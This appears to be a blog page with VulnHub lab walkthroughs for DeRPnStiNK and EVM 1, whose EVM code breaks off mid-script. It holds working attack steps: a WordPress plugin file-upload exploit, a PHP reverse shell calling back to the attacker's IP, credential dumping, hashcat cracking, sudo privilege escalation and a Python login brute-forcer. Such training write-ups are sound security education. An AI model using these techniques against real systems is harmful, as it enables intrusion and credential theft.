| ssh-dss AAAAB3NzaC1kc3MAAACBAMZoT7661ewMcQgzna/qzvkfYaLGwfMnL0VKh3hkBCwGw3jvSXjmjhKw/gR2TnTLFQ9eTDNPTuGsm87dOUSEunbZMvP9GgnA9hOUCI9T1oy5Rs4/AidB9uiVAKN+mefOBBkwh
O74UkzNCZw+SX214uaEyK5tQxcROT8hqqLPbu2lAAAAFQCYTgxWroPZExKzHRqCJUbgQaCV6wAAAIEAifRo93uYV4W0l81ybohh+U2vZdqF7FLMXpyvVLv3wcSs1fa6w+0idZ076luA/RWcO/Cavp1q2Yvvyp7E/uKP
e9fuDV8Qp4g3FArPQB/Bg+CUL90tNLcAiI+0b6lS8ByfwgMzcinP8fzjWeo3ZRyyU+nGqQaoF9kC951bloDJ48sAAACASzBGZ/bwnBU0oZxhuDg4c2YxD+R96JWBvDvMrqlxqZO1NsAAq5o/GU26++Yrk15mXFZgtkV
BxeFXSErjwPkHfMWqY/TNOybUptUtnrqQlvN8tB4VW9sJwbT1AmnAyJZRJZ00x8cxzqvgD6qRyPJCCdNQsUiAnpDQ8RQ5v0cY67M<span class="o">=</span>
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCog1WR41f7pXHcoQcEEDgeARy4bpquU6qGdWxOoc7CSjatxW2e8qi3Le/66/nER15eOFqFXV6dQcS/FQOqjPYtRugPNL16Idrq6BBRhmle+AUCb2Yjwq3rzPnOz
onFj2q5FSi6zzMIhTbrIwB8xF9rEazw/4DInYKCChtN7+xZC5SWk5tXf9/2hrWhvEg8mM0HYjs31SkfO2qn4OyV6/rT+sPts39ILVLN7p8IiOU8vFdbOt4K5xPgTlUIFdHotVHjkakgYZ2cb32DCu/c/qZ3xRU2kcTL
2qjL4Q6crDajXWBpyNGyFhjx88hindUTU6I6BnaWCjaDFabk7JODrf8J
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbUzlHO4L0CcRTLxyaFkqvqoQikn5j1oipMTeYmvIp4D3o7Ht4tvVG9H+hGyX2+jz5cHwx9knygVi9CuXDU9t4<span class="o">=</span>
|   256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK5AF6Fe/U78KCW1vdVjGoYR9NHOpICUnz6uQgVGETII
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries  
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: DeRPnStiNK
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>We focus on the web service, viewing the source code of the page we see the path to the file <strong>info.txt</strong>, we access it, it contains a note specifying that the hosts file must be updated.</p>

<p><img src="/assets/images/derpnstink/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/derpnstink/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/derpnstink/screenshot-3.png" alt="" /></p>

<p>We access to the <strong>webnotes</strong> directory and identify that there’s a <strong>stinky</strong> user, a local mail and the path to the web root.
<img src="/assets/images/derpnstink/screenshot-4.png" alt="" /></p>

<p>Then we enter the domain name and the ip address in the hosts file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.147 derpnstink.local'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<p>I access to the <strong>robots.txt</strong> file and we see two directories, the php directory contains a phpmyadmin but to access we need the mysql credentials, so I decided to run dirb to find hidden files and web directories in the document root of the page.</p>

<p><img src="/assets/images/derpnstink/screenshot-5.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://derpnstink.local/ 
...                                      
<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/css/  
+ http://derpnstink.local/index.html <span class="o">(</span>CODE:200|SIZE:1298<span class="o">)</span> 
<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/javascript/    
<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/js/         
<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/php/     
+ http://derpnstink.local/robots.txt <span class="o">(</span>CODE:200|SIZE:53<span class="o">)</span>  
+ http://derpnstink.local/server-status <span class="o">(</span>CODE:403|SIZE:296<span class="o">)</span>
<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/temporary/     
<span class="o">==&gt;</span> DIRECTORY: http://derpnstink.local/weblog/  
...
</code></pre></div></div>

<p>In the output we can see the <strong>weblog</strong> directory, we access it and we find a wordpress CMS.</p>

<p><img src="/assets/images/derpnstink/screenshot-6.png" alt="" /></p>

<p>Then I run wpscan to detect users and possible vulnerable plugins and themes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://derpnstink.local/weblog/ <span class="nt">-e</span> ap,at,u
...
<span class="o">[</span>+] WordPress version 4.6.9 identified <span class="o">(</span>Insecure, released on 2017-11-29<span class="o">)</span><span class="nb">.</span>
 | Found By: Emoji Settings <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  - http://derpnstink.local/weblog/, Match: <span class="s1">'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9'</span>
 | Confirmed By: Meta Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  - http://derpnstink.local/weblog/, Match: <span class="s1">'WordPress 4.6.9'</span>
 ...
 <span class="o">[</span>+] slideshow-gallery
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/ 
 | Last Updated: 2021-07-12T16:41:00.000Z
 | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 1.7.2
 |
 | Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
 |
 | Version: 1.4.6 <span class="o">(</span>100% confidence<span class="o">)</span>
 ...
 <span class="o">[</span>+] admin
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 ...
</code></pre></div></div>

<p>In the result we see the slideshow plugin version 1.4.6 and the admin user, I try to login to the web page with the <strong>admin</strong> username and password and I have successfull access.</p>

<p><img src="/assets/images/derpnstink/screenshot-7.png" alt="" /></p>

<p><img src="/assets/images/derpnstink/screenshot-8.png" alt="" /></p>

<p>The Slideshow Gallery plugin version 1.4.6 is vulnerable to Arbitrary File Upload as we can see in the following search with searchsploit.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit wordpress slideshow 1.4.6
<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
 Exploit Title                                                         |  Path
<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload       | php/webapps/34514.txt
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload       | php/webapps/34681.txt
<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="arbitrary-file-upload">Arbitrary File Upload</h3>
<p>To exploit this vulnerability we access to <strong>Slideshow -&gt; Manage Slides</strong> and click on edit in one of these.</p>

<p><img src="/assets/images/derpnstink/screenshot-9.png" alt="" /></p>

<p><img src="/assets/images/derpnstink/screenshot-10.png" alt="" /></p>

<p>Then we copy the pentestmonkey reverse shell to our current directory and change the the IP address for to ours and the port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> shell.php
</code></pre></div></div>

<p>First we intercept the request with burpsuite and then we click <strong>Save Slide</strong>, in the <strong>filename</strong> field we change it to the name of our backdoor and after we enter the malicious PHP code, as shown below:</p>

<p><img src="/assets/images/derpnstink/screenshot-11.png" alt="" /></p>

<p>As we see the change was successful.</p>

<p><img src="/assets/images/derpnstink/screenshot-12.png" alt="" /></p>

<p>Then we set up a netcat listener on the attacking machine and execute the curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/evil.php
</code></pre></div></div>

<p>And we have a shell, then we spawn for a pseudo TTY shell, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.147] 60708
Linux DeRPnStiNK 4.4.0-31-generic <span class="c">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux</span>
 23:55:02 up  2:26,  0 <span class="nb">users</span>,  load average: 0.12, 0.07, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ python -c '</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
www-data@DeRPnStiNK:/$ hostname
hostname
DeRPnStiNK
</span></code></pre></div></div>

<p>After we list the MySQL credentials for the wordpress CMS.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@DeRPnStiNK:/var/www/html/weblog<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
...
define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span><span class="o">)</span><span class="p">;</span>                     
                                                    
/<span class="k">**</span> MySQL database username <span class="k">*</span>/                 
define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>                 
                                       
/<span class="k">**</span> MySQL database password <span class="k">*</span>/                  
define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'mysql'</span><span class="o">)</span><span class="p">;</span>                  
                                            
/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/                       
define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
...
</code></pre></div></div>
<p>Then we list the credentials of the wordpress users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@DeRPnStiNK:/var/www/html/weblog<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-p</span>
mysql <span class="nt">-u</span> root <span class="nt">-p</span>     
Enter password: mysql
mysql&gt; show databases<span class="p">;</span>   
show databases<span class="p">;</span>            
+--------------------+         
| Database           |              
+--------------------+       
| information_schema |        
| mysql              |     
| performance_schema |       
| phpmyadmin         |      
| wordpress          |   
+--------------------+         
5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.09 sec<span class="o">)</span>
mysql&gt; use wordpress<span class="p">;</span>
Database changed                    
mysql&gt; <span class="k">select </span>user_login,user_pass from wp_users<span class="p">;</span>
<span class="k">select </span>user_login,user_pass from wp_users<span class="p">;</span>
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| unclestinky | <span class="nv">$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span> |
| admin       | <span class="nv">$P$BgnU3VLAv</span>.RWd3rdrkfVIuQr6mFvpd/ |
+-------------+------------------------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></div></div>

<p>We copy the password hash from unclestinky to crack it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41'</span> <span class="o">&gt;</span> mysql_hash.txt
root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
</code></pre></div></div>

<p>We run hashcat to crack the hash and after a minutes we have the password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 400 mysql_hash.txt rockyou.txt
...
<span class="nv">$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span>:wedgie57
</code></pre></div></div>

<p>I switch to the <strong>stinky</strong> user, in the Documents directory I found the <strong>derpissues.pcap</strong> file, I move this file to the <strong>/var/www/html/temporary</strong> file to download it to the attacking machine for analyze it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@DeRPnStiNK:/<span class="nv">$ </span>su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>stinky<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>stinky<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>stinky<span class="o">)</span>
stinky@DeRPnStiNK:~/Documents<span class="nv">$ </span><span class="nb">cp </span>derpissues.pcap /var/www/html/temporary 
</code></pre></div></div>

<p>Then I download the pcap file, analyzing it I find the credentials for the user <strong>mrderp</strong>, this user has logged into the wordpress page.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget derpnstink.local/temporary/derpissues.pcap
root@kali:~<span class="nv">$ </span>tshark <span class="nt">-r</span> derpissues.pcap <span class="nt">-Y</span> <span class="s1">'http.request.method==POST'</span> <span class="nt">-T</span> fields <span class="nt">-e</span> text 2&gt;/dev/null | <span class="nb">grep</span> <span class="s1">'mrderp'</span> | <span class="nb">tail</span> <span class="nt">-1</span> 
Timestamps,POST /weblog/wp-login.php HTTP/1.1<span class="se">\r\n</span>,<span class="se">\r\n</span>,Form item: <span class="s2">"log"</span> <span class="o">=</span> <span class="s2">"mrderp"</span>,Form item: <span class="s2">"pwd"</span> <span class="o">=</span> <span class="s2">"derpderpderpderpderpderpderp"</span>,Form item: <span class="s2">"wp-submit"</span> <span class="o">=</span> <span class="s2">"Log In"</span>,Form item: <span class="s2">"redirect_to"</span> <span class="o">=</span> <span class="s2">"http://derpnstink.local/weblog/wp-admin/"</span>,Form item: <span class="s2">"testcookie"</span> <span class="o">=</span> <span class="s2">"1"</span>
</code></pre></div></div>
<p>I switch to the <strong>mrderp</strong> user, this has sudo permissions to run a script in the binaries directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stinky@DeRPnStiNK:~<span class="nv">$ </span>su mrderp
su mrderp
Password: derpderpderpderpderpderpderp

mrderp@DeRPnStiNK:/home/stinky<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>mrderp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>mrderp<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>mrderp<span class="o">)</span>
mrderp@DeRPnStiNK:/support<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>mrderp: derpderpderpderpderpderpderp                       

Matching Defaults entries <span class="k">for </span>mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User mrderp may run the following commands on DeRPnStiNK:
    <span class="o">(</span>ALL<span class="o">)</span> /home/mrderp/binaries/derpy<span class="k">*</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>To escalate to root we create the binaries directory, then in this we create the derpy file that contains the /bin/bash instruction, we give the script execution permission, we execute it and we get root.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mrderp@DeRPnStiNK:~<span class="nv">$ </span><span class="nb">mkdir </span>binaries
<span class="nb">mkdir </span>binaries
mrderp@DeRPnStiNK:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash'</span> <span class="o">&gt;</span> binaries/derpy
<span class="nb">echo</span> <span class="s1">'/bin/bash'</span> <span class="o">&gt;</span> binaries/derpy
mrderp@DeRPnStiNK:~<span class="nv">$ </span><span class="nb">chmod</span> +x binaries/derpy
<span class="nb">chmod</span> +x binaries/derpy
mrderp@DeRPnStiNK:~<span class="nv">$ </span><span class="nb">sudo</span> /home/mrderp/binaries/derpy
<span class="nb">sudo</span> /home/mrderp/binaries/derpy
root@DeRPnStiNK:~# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - EVM 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>August 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is super friendly box intended for Beginner’s.</p>

<p><strong>Author:</strong> Ic0de</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/evm-1,391/">https://www.vulnhub.com/entry/evm-1,391/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We start by discovering the target machine on our local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1  192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.144 08:00:27:c3:25:2a       PCS Systemtechnik GmbH
192.168.179.254 00:50:56:e2:ab:f1       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>Then I perform a port scan for all TCP ports with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p1-65535</span> 192.168.179.144 <span class="nt">-oG</span> nmap-tcp-ports.txt
...
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
53/tcp  open  domain       syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
110/tcp open  pop3         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
143/tcp open  imap         syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 08:00:27:C3:25:2A <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>I perform the version detection and script scanning for open TCP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,53,80,110,139,143,445 192.168.179.144 <span class="nt">-oN</span> nmap-service-enum.txt
...
PORT    STATE SERVICE     REASON         VERSION                                                                                                                   
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>                                                              
| ssh-hostkey:                                                                                                                                                     
|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0defjjR1wkIrdUKeTlYiEG2/PwOaaBSPs+pp11hljbqRiUim5Kkf5QCQXS5SsQE2ljdKAVzFbdIgwtGc1TPp1UAgi55uGyzuZMGDN5vItwvzzZxcrkS9CuH9Ne
BQh52Ak6Ki5gsgUf/odg90om62mSVX43mLP4v9nk51qnTc2InstJF37GXqGl05RaGjnramVbP/7vLTX5ondW0hfnwFjtsjkT8w1itwI/dGL/4tMnw+khj5BnTFOTxxC0S+tPlY3dE+jM31i2ftpEB5jOD74Fxeng6JF
1/8fQi8o+9EeJcMUUs8fd9ygw1BNwzCU7gGCysz6yH62ENKApjO/WX+r                                                                                                           
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGbko+cI1o2lFazvX9zJXiqPBgUYyd110OTvgudv/xMdK7IIJkskJ/kVm6XHHre472oDWrmxJRQfTnOS1EgJbTY<span class="o">=</span> 
|   256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILux3BHKEWIkPrmFBz8ag3x3ZZBF638RTPw3GJ+ynllV                                                                                 
53/tcp  open  domain      syn-ack ttl 64 ISC BIND 9.10.3-P4 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>                                                                                         
| dns-nsid:                                                                                                                                                        
|_  bind.version: 9.10.3-P4-Ubuntu                                                                                                                                 
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>                                                                                            
| http-methods:                                                                                                                                                    
|_  Supported Methods: OPTIONS GET HEAD POST                                                                                                                       
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>                                                                                                                       
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                                
110/tcp open  pop3        syn-ack ttl 64 Dovecot pop3d                                                                                                             
|_pop3-capabilities: TOP PIPELINING AUTH-RESP-CODE SASL RESP-CODES UIDL CAPA                                                                                       
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>                                                                               
143/tcp open  imap        syn-ack ttl 64 Dovecot imapd                                                                                                             
|_imap-capabilities: SASL-IR more post-login LOGIN-REFERRALS LITERAL+ listed ENABLE have OK capabilities IMAP4rev1 IDLE Pre-login ID LOGINDISABLEDA0001            
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>I focus on explore the web server and find on the page the following note: <strong><em>you can find me at /wordpress/ im vulnerable webapp :)</em></strong>.</p>

<p><img src="/assets/images/evm/screenshot-1.png" alt="" /></p>

<p>I request the <strong>wordpress</strong> directory but this is not resolved, so I try to see de page source with the browser, we can notice that it’s referring to another IP adress.</p>

<p><img src="/assets/images/evm/screenshot-2.png" alt="" /></p>

<p>To solve this we’ll use port forwarding, start the SSH service on the attacking machine and setup the IP address 192.168.56.103 for my network interface <strong>eth0</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>systemctl start ssh  
root@kali:~<span class="nv">$ </span>ifconfig eth0 192.168.56.103
</code></pre></div></div>

<p>Then I perform the local port forwarding, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-L</span> 192.168.56.103:80:192.168.179.144:80 s4rgaz@127.0.0.1
</code></pre></div></div>

<p>As we can see the problem was solved, we found the username <strong>c0rrupt3d_brain</strong> and in one of the comments it specifies that the webb app is susceptible to brute force attacks and that it contains vulnerable plugins.</p>

<p><img src="/assets/images/evm/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/evm/screenshot-4.png" alt="" /></p>

<p>Then I developed a brute force tool with python, and used the rockyou wordlist.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> wordlist.txt
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span><span class="p">,</span><span class="n">Fore</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">f"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [IP] [User] [Wordlist.txt]"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">init</span><span class="p">()</span>
<span class="n">green</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span>
<span class="n">gray</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">LIGHTBLACK_EX</span>
<span class="n">reset</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">RESET</span>

<span class="n">target</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">user</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">wordlist</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">passwd</span><span class="p">):</span>
    <span class="n">values</span><span class="o">=</span><span class="p">{</span>
            <span class="s">"log"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span>
            <span class="s">"pwd"</span><span class="p">:</span><span class="n">passwd</span><span class="p">,</span>
            <span class="s">"wp-submit"</span><span class="p">:</span><span class="s">"Log+In"</span>
            <span class="p">}</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">f"http://</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/wordpress/wp-login.php"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">values</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="n">ans</span><span class="o">=</span><span class="n">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">password</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">"ERROR"</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
